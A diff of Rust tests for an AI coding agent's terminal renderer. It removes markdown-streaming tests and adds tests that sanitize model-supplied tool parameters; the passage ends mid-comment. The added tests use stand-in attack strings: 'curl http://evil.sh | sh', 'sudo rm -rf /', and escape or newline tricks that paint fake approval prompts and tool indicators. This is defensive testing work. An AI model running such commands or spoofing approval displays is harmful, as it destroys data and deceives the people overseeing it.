-        let emphasized = strip_ansi_escapes(&termimad_stream(
-            "__bold text__ and _italic text_ here\n",
-            usize::MAX,
-        ));
-        assert!(
-            !emphasized.contains('_'),
-            "underscore emphasis markers must be consumed, not shown; got {emphasized:?}",
-        );
-        assert!(
-            emphasized.contains("bold text") && emphasized.contains("italic text"),
-            "the emphasized words must survive; got {emphasized:?}",
-        );
-
-        let identifiers = strip_ansi_escapes(&termimad_stream(
-            "call snake_case_name and foo_bar here\n",
-            usize::MAX,
-        ));
-        assert!(
-            identifiers.contains("snake_case_name") && identifiers.contains("foo_bar"),
-            "intraword underscores are literal; got {identifiers:?}",
-        );
-    }
-
-    /// termimad paints a fenced block in one flat color regardless of language. Routing blocks
-    /// through the syntect renderer the other mode already uses is the whole point of the change.
-    #[test]
-    fn fenced_code_block_is_syntax_highlighted() {
-        let rendered = termimad_render("```rust\nfn main() { let x = 42; }\n```\n");
-        assert!(
-            fg_color_set(&rendered).len() >= 4,
-            "a highlighted block has several colors, not one flat run; got {:?}",
-            fg_color_set(&rendered),
-        );
-    }
-
-    /// A code block containing a blank line must not be split at the `\n\n`, or each half renders
-    /// separately with an unbalanced fence.
-    #[test]
-    fn code_block_containing_a_blank_line_survives() {
-        let rendered = termimad_render("```rust\nfn a() {}\n\nfn b() {}\n```\n\nafter\n");
-        let plain = strip_ansi_escapes(&rendered);
-        assert!(
-            plain.contains("fn a() {}") && plain.contains("fn b() {}"),
-            "both halves of the block must render; got {plain:?}",
-        );
-        assert!(
-            plain.contains("after"),
-            "content after the block must still render; got {plain:?}",
-        );
-    }
-
-    /// An interrupted or truncated response can leave a fence open. Its lines are still content.
-    #[test]
-    fn unterminated_code_block_still_renders() {
-        let rendered = termimad_render("```rust\nfn main() {}\n");
-        assert!(
-            strip_ansi_escapes(&rendered).contains("fn main() {}"),
-            "an unclosed block must not swallow its body; got {rendered:?}",
-        );
-    }
-
-    /// Wrapping wide tables is the reason to pick this mode over syntect, so it has to survive the
-    /// restructuring.
-    #[test]
-    fn wide_table_still_wraps() {
-        let rendered = termimad_render(
-            "| Col | Description |\n|---|---|\n| a | one two three four five six seven eight \
-             nine ten eleven twelve thirteen |\n\n",
-        );
-        let plain = strip_ansi_escapes(&rendered);
-        assert!(
-            plain.lines().count() >= 4,
-            "a long cell should wrap onto extra rows; got {plain:?}",
-        );
-        assert!(
-            plain.lines().all(|line| line.chars().count() <= 80),
-            "no rendered line may exceed the render width; got {plain:?}",
-        );
-    }
-
-    /// A turn whose final delta ends in a newline leaves the buffer empty while a table or an
-    /// unterminated fence is still pending. Skipping the drains in that case loses a reply's
-    /// trailing table completely. Asserts on the renderer's own state because the drain itself
-    /// writes to stdout.
-    ///
-    /// The cases are listed per mode because the two buffer differently: syntect collects table
-    /// rows in `raw_table_lines`, while termimad hands tables to minimad and holds partial ones in
-    /// `buffer`.
-    #[test]
-    fn finish_drains_pending_state_when_the_buffer_is_empty() {
-        let cases = [(RenderMode::Termimad, "```rust\nfn main() {}\n")];
-        for (mode, input) in cases {
-            let mut renderer = StreamingRenderer::new(mode);
-            renderer.push_delta(input).unwrap();
-            assert!(
-                renderer.buffer.is_empty()
-                    && (!renderer.raw_table_lines.is_empty()
-                        || !renderer.code_block_lines.is_empty()),
-                "{mode:?} / {input:?}: precondition is an empty buffer with content still pending",
-            );
-            renderer.finish().unwrap();
-            assert!(
-                renderer.raw_table_lines.is_empty() && renderer.code_block_lines.is_empty(),
-                "{mode:?} / {input:?}: finish must render pending content, not drop it",
-            );
-        }
-    }
-
-    /// Drive the termimad path the way `push_delta`/`finish` do, but returning the output so it
-    /// can be asserted on. `chunk_chars` splits the input the way a stream would.
-    fn termimad_stream(markdown: &str, chunk_chars: usize) -> String {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad).with_width(76);
-        renderer.started = true;
-        let mut output = String::new();
-        let chars: Vec<char> = markdown.chars().collect();
-        for chunk in chars.chunks(chunk_chars.max(1)) {
-            renderer.buffer.push_str(&chunk.iter().collect::<String>());
-            output.push_str(&renderer.take_termimad_output());
-        }
-        let tail = std::mem::take(&mut renderer.buffer);
-        output.push_str(&renderer.finish_termimad_output(tail.trim_end_matches('\n')));
-        output
-    }
-
-    /// The agent substitutes a bracketed stand-in when a turn produces no content (see
-    /// `agent::empty_turn_notice`) and streams it as ordinary assistant text, so it lands in the
-    /// markdown renderer like any other prose. A leading `[` opens a link in CommonMark, and these
-    /// notices are the user's only signal that the turn happened at all, so a parser that swallowed
-    /// the brackets - or the line - would turn a reported failure back into a silent one.
-    #[test]
-    fn termimad_preserves_bracketed_empty_turn_notices() {
-        for notice in [
-            "[The model returned an empty response.]",
-            "[The model returned an empty response (stop reason: pause_turn).]",
-            "[The model declined to respond to this request.]",
-            "[The model reached its output limit before producing a response.]",
-        ] {
-            assert_eq!(
-                termimad_stream(notice, 4096).trim_end(),
-                notice,
-                "the stand-in notice must render verbatim"
-            );
-        }
-    }
-
-    /// Documents that between them cover every branch of the termimad flush: prose, headings,
-    /// lists, tables, fences (closed, unterminated, containing blank lines), and the adjacencies
-    /// between them. Tokens are short and unique so wrapping can't split one.
-    const STREAMING_CORPUS: &[&str] = &[
-        "t01 t02 t03\n\nt04 t05\n",
-        "## t06\n\nt07 **t08** *t09* `t10`\n",
-        "- t11\n- t12\n  - t13\n    - t14\n",
-        "| t15 | t16 |\n|---|---|\n| t17 | t18 |\n\nt19\n",
-        "```rust\nlet t20 = 1;\n\nlet t21 = 2;\n```\n\nt22\n",
-        "```\nt23\n",
-        // A line that starts with `|` but doesn't end with one sits between prose and a fence:
-        // this is the shape that can spin the flush loop forever.
-        "| t24\n```rust\nlet t25 = 3;\n```\n",
-        "```rust\nlet t26 = 4;\n```\n| t27 | t28 |\n|---|---|\n| t29 | t30 |\n\n",
-        "> t31\n\n---\n\nt32\n",
-        "t33\n\n### t34\n\n- t35\n\n```sh\necho t36\n```\n\nt37\n",
-        // Ends on a table row with no trailing blank line, so the rows are still pending when the
-        // turn finishes. This is the shape that rendered as one broken single-row table per line.
-        "t38\n\n| t39 | t40 |\n|---|---|\n| t41 | t42 |\n",
-        // A code block whose body would be mistaken for markdown if the fence state were lost.
-        "```sh\n# t43\nls t44\n```\n",
-    ];
-
-    /// Every byte pushed has to come out exactly once, whatever offsets the stream is chopped at.
-    /// Chunking at one character per delta puts a split inside every fence, table row, and marker.
-    #[test]
-    fn termimad_streaming_preserves_content_at_every_chunk_boundary() {
-        for document in STREAMING_CORPUS {
-            let tokens: Vec<&str> = document
-                .split(|c: char| !c.is_ascii_alphanumeric())
-                .filter(|word| word.len() == 3 && word.starts_with('t'))
-                .collect();
-            assert!(
-                !tokens.is_empty(),
-                "corpus entry has no tokens: {document:?}"
-            );
-
-            for chunk in [1, 2, 3, 5, 11, usize::MAX] {
-                let rendered = strip_ansi_escapes(&termimad_stream(document, chunk));
-                for token in &tokens {
-                    assert_eq!(
-                        rendered.matches(token).count(),
-                        1,
-                        "{token} should appear exactly once for chunk size {chunk} of \
-                         {document:?}; got {rendered:?}",
-                    );
-                }
-            }
-        }
-    }
-
-    /// After one pass, everything the flush could legally render must be gone from the buffer.
-    ///
-    /// Two things qualify. Prose is settled once a blank line follows it, so no blank line may
-    /// remain. A complete fenced block is self-delimiting and is taken the moment its opening fence
-    /// line is whole, so no complete fence line may remain either. What is allowed to stay is the
-    /// final open block: a trailing table, an unfinished paragraph, a partial line.
-    ///
-    /// Stopping earlier than that is the failure this guards: it hangs the flush loop, and even
-    /// with the loop's progress check it silently defers the rest of the turn to `finish`, so
-    /// output arrives in one burst at the end instead of streaming.
-    #[test]
-    fn flush_consumes_everything_it_can_in_one_pass() {
-        for document in STREAMING_CORPUS {
-            let mut renderer = StreamingRenderer::new(RenderMode::Termimad).with_width(76);
-            renderer.started = true;
-            renderer.buffer = document.to_string();
-            renderer.take_termimad_output();
-            let left = renderer.buffer.clone();
-            assert!(
-                !left.contains("\n\n"),
-                "settled prose left unrendered in {left:?} from {document:?}",
-            );
-            assert!(
-                !left
-                    .lines()
-                    .any(|line| is_code_fence(line) && left.contains(&format!("{line}\n"))),
-                "a complete fence line left unconsumed in {left:?} from {document:?}",
-            );
-        }
-    }
-
-    /// Whatever the mode and however the stream is chopped, a finished turn must leave nothing
-    /// buffered: anything still held after `finish` is content that was never shown. A table whose
-    /// last delta ends in a newline is the case that breaks it. Runs every mode: they share the
-    /// same buffers.
-    #[test]
-    fn finish_leaves_nothing_buffered_in_any_mode() {
-        let modes = [RenderMode::Termimad, RenderMode::Raw];
-        for document in STREAMING_CORPUS {
-            for mode in modes {
-                for chunk in [1, 3, 17, usize::MAX] {
-                    let mut renderer = StreamingRenderer::new(mode);
-                    let chars: Vec<char> = document.chars().collect();
-                    for piece in chars.chunks(chunk.max(1)) {
-                        renderer
-                            .push_delta(&piece.iter().collect::<String>())
-                            .expect("push_delta");
-                    }
-                    renderer.finish().expect("finish");
-                    assert!(
-                        renderer.buffer.is_empty()
-                            && renderer.raw_table_lines.is_empty()
-                            && renderer.code_block_lines.is_empty(),
-                        "{mode:?} left content buffered after finish for chunk {chunk} of \
-                         {document:?}: buffer={:?} table={:?} code={:?}",
-                        renderer.buffer,
-                        renderer.raw_table_lines,
-                        renderer.code_block_lines,
-                    );
-                }
-            }
-        }
-    }
-
-    /// minimad sizes table columns per document, so a table handed to it one row at a time becomes
-    /// a series of single-row tables: columns don't line up, the separator row renders as its own
-    /// empty box, and nothing wraps. A reply ending in a table hits this, because a trailing table
-    /// is deliberately held back for the stream to finish.
-    #[test]
-    fn table_at_end_of_reply_renders_as_one_table() {
-        let rendered = strip_ansi_escapes(&termimad_stream(
-            "Comparison:\n\n| Option | Notes |\n|---|---|\n| fast | skips validation entirely |\n\
-             | safe | revalidates everything first |\n",
-            usize::MAX,
-        ));
-        // One table means one separator row, and every row the same width.
-        assert_eq!(
-            rendered.matches('\u{251c}').count(),
-            1,
-            "expected a single separator row; got {rendered:?}",
-        );
-        let widths: std::collections::BTreeSet<usize> = rendered
-            .lines()
-            .filter(|line| line.contains('\u{2502}'))
-            .map(|line| line.chars().count())
-            .collect();
-        assert_eq!(
-            widths.len(),
-            1,
-            "every row of one table is the same width; got {widths:?} from {rendered:?}",
-        );
-    }
-
-    /// `normalize_spacing` re-derives fence state from the buffer, but the flush consumes the
-    /// opening fence into `code_block_lines` first, so the buffer alone looks like top-level
-    /// markdown. Without being told, it treats a `#` line in a shell snippet as a heading and
-    /// inserts a blank line into the user's code.
-    #[test]
-    fn code_block_body_is_not_reflowed_as_markdown() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
-        renderer.push_delta("```sh\n").expect("fence");
-        renderer.push_delta("# comment\nls -la\n").expect("body");
-        assert_eq!(
-            renderer.code_block_lines,
-            vec!["```sh", "# comment", "ls -la"],
-            "markdown spacing was injected into a code block body",
-        );
-    }
-
-    /// Blocks have to be separated by a blank line. minimad renders a flat list of lines with no
-    /// concept of a block, so without an explicit empty line a whole reply renders as one slab.
-    #[test]
-    fn blocks_are_separated_by_blank_lines() {
-        let rendered = strip_ansi_escapes(&termimad_stream(
-            "## Title\n\nA paragraph.\n\n- an item\n\nAnother paragraph.\n",
-            usize::MAX,
-        ));
-        let blanks = rendered
-            .lines()
-            .filter(|line| line.trim().is_empty())
-            .count();
-        assert!(
-            blanks >= 3,
-            "expected a blank line between each pair of blocks; got {rendered:?}",
-        );
-        assert!(
-            !rendered.ends_with("\n\n"),
-            "the last block must not trail a separator; got {rendered:?}",
-        );
-    }
-
-    /// A paragraph written across several source lines is one paragraph, so it reflows to the
-    /// terminal width rather than keeping the model's line breaks. Line-at-a-time rendering could
-    /// not do this.
-    #[test]
-    fn multi_line_paragraph_reflows() {
-        let source = "alpha bravo charlie\ndelta echo foxtrot\ngolf hotel india\n\n";
-        let rendered = strip_ansi_escapes(&termimad_stream(source, usize::MAX));
-        let body: Vec<&str> = rendered
-            .lines()
-            .filter(|line| !line.trim().is_empty())
-            .collect();
-        assert_eq!(
-            body.len(),
-            1,
-            "three short source lines are one paragraph at width 76; got {body:?}",
-        );
-        assert!(body[0].contains("alpha") && body[0].contains("india"));
-    }
-
-    /// Ordered lists have no minimad equivalent. Rendering them as bullets would discard the
-    /// numbering, which is the whole content of a numbered instruction.
-    #[test]
-    fn ordered_lists_keep_their_numbers() {
-        let rendered = strip_ansi_escapes(&termimad_stream("1. first\n2. second\n\n", usize::MAX));
-        assert!(
-            rendered.contains("1. first") && rendered.contains("2. second"),
-            "numbering must survive; got {rendered:?}",
-        );
-        assert!(
-            !rendered.contains('\u{2022}'),
-            "an ordered item is not a bullet; got {rendered:?}",
-        );
-    }
-
-    /// A terminal can't follow a link, so the destination is shown next to the text instead of the
-    /// raw `[text](url)` minimad would have printed verbatim.
-    #[test]
-    fn links_render_text_and_destination() {
-        let rendered = strip_ansi_escapes(&termimad_stream(
-            "see [the docs](https://example.com) now\n\n",
-            usize::MAX,
-        ));
-        assert!(
-            rendered.contains("the docs") && rendered.contains("https://example.com"),
-            "both the text and the target should show; got {rendered:?}",
-        );
-        assert!(
-            !rendered.contains("]("),
-            "the markdown syntax itself must not survive; got {rendered:?}",
-        );
-    }
-
-    /// Emphasis nests, and the inner span closing must not end the outer one.
-    #[test]
-    fn nested_emphasis_survives() {
-        let rendered = strip_ansi_escapes(&termimad_stream(
-            "**bold with *inner* tail**\n\n",
-            usize::MAX,
-        ));
-        assert!(
-            rendered.contains("bold with inner tail"),
-            "markers consumed, text intact; got {rendered:?}",
-        );
-    }
-
-    /// The default reaches every path that does not name a mode, so it is worth pinning rather than
-    /// inheriting from whichever variant happens to be declared first.
-    #[test]
-    fn render_mode_default() {
-        assert_eq!(RenderMode::default(), RenderMode::Termimad);
-    }
-
-    /// With stdout redirected there is no width to reflow to, and `termimad::terminal_size()`
-    /// answers with a 50-column fallback. Wrapping an answer that narrowly on its way into a file
-    /// is worse than not wrapping it, and this is the default mode now, so every piped run would
-    /// hit it. Tests run without a terminal, which is exactly the case being pinned.
-    #[test]
-    fn termimad_does_not_reflow_without_a_terminal() {
-        let sentence = "word ".repeat(60);
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
-        renderer.started = true;
-        renderer.buffer = sentence;
-        let rendered = renderer.finish_termimad_output(renderer.buffer.clone().trim_end());
-
-        let longest = rendered
-            .lines()
-            .map(|line| strip_ansi_escapes(line).chars().count())
-            .max()
-            .unwrap_or(0);
-        assert!(
-            longest > 50,
-            "a redirected run must not be hard-wrapped to the 50-column fallback; longest line \
-             was {longest}",
-        );
-    }
-
     #[test]
     fn a_table_line_is_pipe_delimited_on_both_ends() {
         assert!(is_table_line("| A | B |"));
@@ -4788,260 +1168,6 @@ mod tests {
         assert!(!is_table_line("|"));
         assert!(!is_table_line("not a table"));
         assert!(!is_table_line("| no trailing pipe"));
-    }
-
-    #[test]
-    fn parse_table_row_trims_each_cell() {
-        let cells = parse_table_row("| Alpha | Beta | Gamma |");
-        assert_eq!(cells, vec!["Alpha", "Beta", "Gamma"]);
-    }
-
-    #[test]
-    fn parse_table_row_no_spaces() {
-        let cells = parse_table_row("|A|B|C|");
-        assert_eq!(cells, vec!["A", "B", "C"]);
-    }
-
-    #[test]
-    fn a_separator_row_is_dashes_with_optional_alignment_colons() {
-        assert!(is_separator_row(&[
-            "---".to_string(),
-            "----".to_string(),
-            "---".to_string()
-        ]));
-        assert!(is_separator_row(&[":--".to_string(), ":-:".to_string()]));
-        assert!(!is_separator_row(&["Name".to_string(), "---".to_string()]));
-    }
-
-    #[test]
-    fn format_table_alignment() {
-        let lines = vec![
-            "| Name | Value |".to_string(),
-            "|------|-------|".to_string(),
-            "| A | 100 |".to_string(),
-            "| Beta | 2 |".to_string(),
-        ];
-        let result = format_table(&lines);
-        assert_eq!(result.len(), 4);
-
-        // All rows should have the same length
-        let first_len = result[0].len();
-        for (index, row) in result.iter().enumerate() {
-            assert_eq!(
-                row.len(),
-                first_len,
-                "row {} has length {} but expected {}",
-                index,
-                row.len(),
-                first_len
-            );
-        }
-
-        // Check content is padded
-        assert_eq!(result[0], "| Name | Value |");
-        assert_eq!(result[2], "| A    | 100   |");
-        assert_eq!(result[3], "| Beta | 2     |");
-    }
-
-    #[test]
-    fn format_table_wide_columns() {
-        let lines = vec![
-            "| # | Name | Type | Status | Score |".to_string(),
-            "|---|------|------|--------|-------|".to_string(),
-            "| 1 | Alpha | Primary | Pass | 98.5 |".to_string(),
-            "| 2 | Beta | Secondary | Warn | 75.0 |".to_string(),
-            "| 3 | Gamma | Primary | Pass | 91.2 |".to_string(),
-        ];
-        let result = format_table(&lines);
-        let first_len = result[0].len();
-        for (index, row) in result.iter().enumerate() {
-            assert_eq!(
-                row.len(),
-                first_len,
-                "row {} has length {} but expected {}",
-                index,
-                row.len(),
-                first_len
-            );
-        }
-    }
-
-    #[test]
-    fn format_table_empty() {
-        let result = format_table(&[]);
-        assert!(result.is_empty());
-    }
-
-    #[test]
-    fn format_table_minimum_separator_width() {
-        let lines = vec![
-            "| A | B |".to_string(),
-            "|---|---|".to_string(),
-            "| C | D |".to_string(),
-        ];
-        let result = format_table(&lines);
-        // Separator dashes should be at least 3 wide
-        assert!(result[1].contains("---"));
-    }
-
-    #[test]
-    fn format_table_emoji_single() {
-        let lines = vec![
-            "| Status | Name |".to_string(),
-            "|---|---|".to_string(),
-            "| 🟢 Pass | Alpha |".to_string(),
-            "| 🔴 Fail | Beta |".to_string(),
-        ];
-        let result = format_table(&lines);
-        assert_eq!(result.len(), 4);
-
-        // All rows should have the same display width
-        let first_width = display_width(&result[0]);
-        for (index, row) in result.iter().enumerate() {
-            assert_eq!(
-                display_width(row),
-                first_width,
-                "row {} has display width {} but expected {}",
-                index,
-                display_width(row),
-                first_width
-            );
-        }
-    }
-
-    #[test]
-    fn format_table_emoji_multiple() {
-        let lines = vec![
-            "| Icon | Desc |".to_string(),
-            "|---|---|".to_string(),
-            "| 🟢🟢🟢 | Good |".to_string(),
-            "| 🔴 | Bad |".to_string(),
-        ];
-        let result = format_table(&lines);
-        let first_width = display_width(&result[0]);
-        for (index, row) in result.iter().enumerate() {
-            assert_eq!(
-                display_width(row),
-                first_width,
-                "row {} has display width {} but expected {}",
-                index,
-                display_width(row),
-                first_width
-            );
-        }
-    }
-
-    #[test]
-    fn format_table_emoji_mixed_with_ascii() {
-        let lines = vec![
-            "| Segment | Change | Verdict |".to_string(),
-            "|---|---|---|".to_string(),
-            "| Canadian Banking | -9% | 🔴 Credit losses |".to_string(),
-            "| Global Wealth | +17% | 🟢 AUM growth |".to_string(),
-            "| Other | Flat | No emoji here |".to_string(),
-        ];
-        let result = format_table(&lines);
-        let first_width = display_width(&result[0]);
-        for (index, row) in result.iter().enumerate() {
-            assert_eq!(
-                display_width(row),
-                first_width,
-                "row {} has display width {} but expected {}",
-                index,
-                display_width(row),
-                first_width
-            );
-        }
-    }
-
-    #[test]
-    fn raw_mode_prints_text_verbatim() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Raw).capturing(80);
-        renderer.push_delta("**bold** text\n").unwrap();
-        renderer.finish().unwrap();
-        let captured = renderer.captured();
-        assert_eq!(
-            captured.trim_end(),
-            "**bold** text",
-            "raw mode neither styles nor strips markup"
-        );
-        assert!(
-            !captured.contains('\x1b'),
-            "no escapes in raw mode: {captured:?}"
-        );
-    }
-
-    #[test]
-    fn raw_mode_table_buffering() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Raw).capturing(80);
-        renderer
-            .push_delta("| A | B |\n|---|---|\n| C | D |\n\nafter table\n")
-            .unwrap();
-        renderer.finish().unwrap();
-        let captured = renderer.captured();
-        let table_end = captured
-            .find('D')
-            .expect("the table's last cell is rendered");
-        let prose = captured
-            .find("after table")
-            .expect("the prose after the table is rendered");
-        assert!(
-            table_end < prose,
-            "the buffered table is flushed before the prose that follows it: {captured:?}"
-        );
-    }
-
-    #[test]
-    fn raw_mode_table_at_end() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Raw).capturing(80);
-        renderer
-            .push_delta("| A | B |\n|---|---|\n| C | D |")
-            .unwrap();
-        renderer.finish().unwrap();
-        let captured = renderer.captured();
-        assert!(
-            captured.contains('C') && captured.contains('D'),
-            "a table still buffered at finish is flushed: {captured:?}"
-        );
-    }
-
-    #[test]
-    fn finish_trims_trailing_newlines_raw() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Raw).capturing(80);
-        renderer.push_delta("hello\n\n\n").unwrap();
-        renderer.finish().unwrap();
-        let captured = renderer.captured();
-        assert!(captured.contains("hello"), "{captured:?}");
-        assert!(
-            !captured.ends_with("\n\n"),
-            "trailing blank rows are held back, not printed: {captured:?}"
-        );
-    }
-
-    #[test]
-    fn finish_trims_trailing_newlines_termimad() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad).capturing(80);
-        renderer.push_delta("hello\n\n\n").unwrap();
-        renderer.finish().unwrap();
-        let captured = renderer.captured();
-        assert!(captured.contains("hello"), "{captured:?}");
-        assert!(
-            !captured.ends_with("\n\n"),
-            "trailing blank rows are held back, not printed: {captured:?}"
-        );
-    }
-
-    #[test]
-    fn finish_only_newlines() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Raw).capturing(80);
-        renderer.started = true;
-        renderer.buffer = "\n\n\n".to_string();
-        renderer.finish().unwrap();
-        assert!(
-            renderer.captured().trim().is_empty(),
-            "a buffer of blank rows prints nothing: {:?}",
-            renderer.captured()
-        );
     }
 
     #[test]
@@ -5119,5 +1245,387 @@ mod tests {
         let input = "| A | B |\n|---|---|\n| 1 | 2 |";
         let output = normalize_spacing(input, false);
         assert_eq!(output, "| A | B |\n|---|---|\n| 1 | 2 |");
+    }
+
+    /// A carriage return returns the cursor to column zero, so a value carrying one overwrites the
+    /// key that introduced it and can repaint the row as anything.
+    #[test]
+    fn a_carriage_return_cannot_overwrite_the_line_it_sits_on() {
+        let rendered = params(serde_json::json!({
+            "path": "/tmp/notes.txt\r[approval] shell_execute curl http://evil.sh | sh (Y/n) ",
+        }));
+        assert!(!rendered.contains('\r'), "{rendered:?}");
+        assert_eq!(rendered.lines().count(), 1, "{rendered}");
+    }
+
+    /// Indentation is the only thing separating model text from meka's own chrome, and
+    /// `sanitize_for_display` keeps newlines on purpose. A key carrying one would put the rest of
+    /// itself at column 0, where it can be shaped like a real indicator.
+    #[test]
+    fn a_key_cannot_break_out_of_the_block_with_a_newline() {
+        let mut input = serde_json::Map::new();
+        input.insert(
+            "1\n[tool shell_execute(`curl evil.sh | sh`)]".to_string(),
+            serde_json::json!("completed"),
+        );
+        let rendered = params(serde_json::Value::Object(input));
+        assert_eq!(rendered.lines().count(), 1, "{rendered}");
+        assert_eq!(
+            rendered,
+            "  1 [tool shell_execute(`curl evil.sh | sh`)]: completed"
+        );
+    }
+
+    /// Keys come from the model too, by way of an MCP tool's arguments.
+    #[test]
+    fn a_key_is_sanitized_as_well_as_its_value() {
+        let mut input = serde_json::Map::new();
+        input.insert("na\u{1b}[31mme".to_string(), serde_json::json!("value"));
+        assert_eq!(params(serde_json::Value::Object(input)), "  name: value");
+    }
+
+    /// The budget is the whole row, so a long key has to leave room for the value rather than
+    /// spending the width and letting it overflow: every row stays within the width and the value
+    /// is still there.
+    #[test]
+    fn a_long_key_still_leaves_room_for_its_value() {
+        let rendered = params(serde_json::json!({"k".repeat(5000): "v".repeat(5000)}));
+        assert!(
+            rendered
+                .lines()
+                .all(|line| super::display_width(line) <= TEST_WIDTH),
+            "{rendered}"
+        );
+        assert!(rendered.contains("vvvv"), "{rendered}");
+    }
+
+    /// `push_param` grew a multi-line arm and `push_item` did not, so a bulleted string kept its
+    /// newlines and put every line after the first at column 0.
+    #[test]
+    fn a_multi_line_array_element_becomes_a_block_not_a_column_zero_run() {
+        let rendered = params(serde_json::json!({
+            "tools": ["file_read\n[tool shell_execute(`sudo rm -rf /`)]"],
+        }));
+        assert_eq!(
+            rendered,
+            "  tools:\n    -\n      file_read\n      [tool shell_execute(`sudo rm -rf /`)]"
+        );
+        assert!(
+            rendered.lines().all(|line| line.starts_with("  ")),
+            "{}",
+            rendered
+        );
+    }
+
+    /// The case the whole format exists for. As JSON this is one line of `\\n` escapes, which is
+    /// unreadable for exactly the two tools whose arguments most need reading.
+    #[test]
+    fn a_multi_line_string_becomes_an_indented_block_under_a_bare_key() {
+        assert_eq!(
+            params(serde_json::json!({
+                "path": "src/render.rs",
+                "old_string": "let first = lines.next();\nlet cut = truncate(first);",
+            })),
+            "  path: src/render.rs\n  old_string:\n    let first = lines.next();\n    let cut = \
+             truncate(first);"
+        );
+    }
+
+    #[test]
+    fn a_nested_object_recurses_by_indentation() {
+        assert_eq!(
+            params(serde_json::json!({"set": {"1": "completed", "2": "pending"}})),
+            "  set:\n    1: completed\n    2: pending"
+        );
+    }
+
+    #[test]
+    fn a_non_object_input_still_renders_its_value() {
+        assert_eq!(params(serde_json::json!("bare")), "  bare");
+    }
+
+    #[test]
+    fn a_top_level_array_input_is_bulleted_like_any_other_array() {
+        assert_eq!(
+            params(serde_json::json!(["file_read", "file_edit"])),
+            "  - file_read\n  - file_edit"
+        );
+    }
+
+    /// A `file_write` body almost always ends with a newline. Treating that as multi-line turned a
+    /// one-line value into a bare `key:` plus a single indented line.
+    #[test]
+    fn a_trailing_newline_does_not_split_a_one_line_value() {
+        assert_eq!(
+            params(serde_json::json!({"content": "one line\n"})),
+            "  content: one line"
+        );
+    }
+
+    /// Reporting a tab as `(empty)` is not vague, it is wrong: it says the model passed `""`.
+    #[test]
+    fn a_whitespace_only_value_is_not_reported_as_empty() {
+        assert_eq!(
+            params(serde_json::json!({"delimiter": "\t", "body": "", "pad": " ".repeat(300)})),
+            "  delimiter: (whitespace)\n  body: (empty)\n  pad: (whitespace)"
+        );
+    }
+
+    /// A list of records has to read as records: the first field shares the bullet line and the
+    /// rest align under it, so the eye can follow one element's fields down the block.
+    #[test]
+    fn an_array_of_objects_bullets_the_first_field_and_aligns_the_rest() {
+        assert_eq!(
+            params(serde_json::json!({
+                "items": [
+                    {"id": 1, "text": "Fix the preview", "status": "completed"},
+                    {"id": 2, "text": "Show full params", "status": "in_progress"},
+                ]
+            })),
+            "  items:\n    - id: 1\n      text: Fix the preview\n      status: completed\n    \
+             - id: 2\n      text: Show full params\n      status: in_progress"
+        );
+    }
+
+    #[test]
+    fn an_array_of_scalars_is_a_plain_bullet_list() {
+        assert_eq!(
+            params(serde_json::json!({"tools": ["file_read", "file_edit"]})),
+            "  tools:\n    - file_read\n    - file_edit"
+        );
+    }
+
+    /// `key:` with nothing after it is how a block-valued key opens, so an empty value has to say
+    /// so rather than looking like a block that failed to render.
+    #[test]
+    fn empty_values_are_marked_rather_than_left_blank() {
+        assert_eq!(
+            params(serde_json::json!({"body": "", "tags": [], "meta": {}, "parent": null})),
+            "  body: (empty)\n  tags: (empty)\n  meta: (empty)\n  parent: null"
+        );
+    }
+
+    /// Every value is model-supplied, and `full` shows all of them rather than the one the summary
+    /// picked, so the escape-stripping that protects the summary has to cover the whole block.
+    #[test]
+    fn every_value_is_stripped_of_escapes_not_just_the_primary_one() {
+        let rendered = params(serde_json::json!({
+            "path": "safe.txt",
+            "content": "harmless\n\u{1b}[2J\u{1b}[1;1H> Approve? (y/n)",
+        }));
+        assert!(!rendered.contains('\u{1b}'), "{}", rendered);
+        assert!(rendered.contains("Approve?"), "{}", rendered);
+    }
+
+    #[test]
+    fn full_params_put_scalars_on_the_key_line() {
+        assert_eq!(
+            params(serde_json::json!({"command": "cargo test --bin meka", "timeout": 300})),
+            "  command: cargo test --bin meka\n  timeout: 300"
+        );
+    }
+
+    /// A tab cannot move the cursor left or up, so it forges nothing and never needed flattening.
+    /// Collapsing it to one space destroyed the indentation of every tab-indented file.
+    #[test]
+    fn tabs_are_expanded_so_indented_code_survives() {
+        assert_eq!(
+            params(serde_json::json!({"content": "func main() {\n\tif ok {\n\t\treturn\n\t}\n}"})),
+            "  content:\n    func main() {\n        if ok {\n            return\n        }\n    }"
+        );
+    }
+
+    /// The width is counted in columns, not characters: a full-width line is twice as wide as its
+    /// character count suggests, and a budget that missed that would let it wrap into rows the
+    /// budget exists to prevent.
+    #[test]
+    fn the_width_cap_counts_columns_not_characters() {
+        let wide = "\u{ff21}".repeat(300);
+        let rendered = params(serde_json::json!({"a": wide}));
+        assert!(
+            rendered
+                .lines()
+                .all(|line| super::display_width(line) <= TEST_WIDTH),
+            "{rendered}"
+        );
+    }
+
+    /// `unicode_width` measures a soft hyphen as zero columns; a terminal following `wcwidth` draws
+    /// one. Left in, a run of them passes any column budget unmeasured and wraps for as many rows
+    /// as the model likes, which defeats every cap at once.
+    #[test]
+    fn zero_measured_format_characters_cannot_evade_the_width_cap() {
+        for probe in ['\u{00ad}', '\u{200b}', '\u{202e}', '\u{feff}'] {
+            let rendered = params(serde_json::json!({"q": probe.to_string().repeat(2000)}));
+            assert!(!rendered.contains(probe), "{probe:?} survived");
+            assert_eq!(rendered, "  q: (no printable text)", "{probe:?}");
+        }
+    }
+
+    /// A reasoning summary's `**Bold header**` reaches the row as a bold run, not as asterisks,
+    /// and nothing past the header inherits the emphasis.
+    #[test]
+    fn a_thinking_preview_styles_its_markers_rather_than_showing_them() {
+        let runs = super::thinking_preview_runs("**Planning research**\n\nThen check it.");
+        assert_eq!(
+            runs.iter().map(|run| run.text.as_str()).collect::<String>(),
+            "Planning research Then check it."
+        );
+        assert!(
+            runs[0].bold,
+            "the header keeps its emphasis: {:?}",
+            runs[0].text
+        );
+        assert!(
+            runs.iter()
+                .filter(|run| run.bold)
+                .all(|run| run.text == "Planning research"),
+            "and nothing past it inherits the emphasis",
+        );
+    }
+
+    /// Reasoning is model output: an escape on any line of the block is stripped before the row
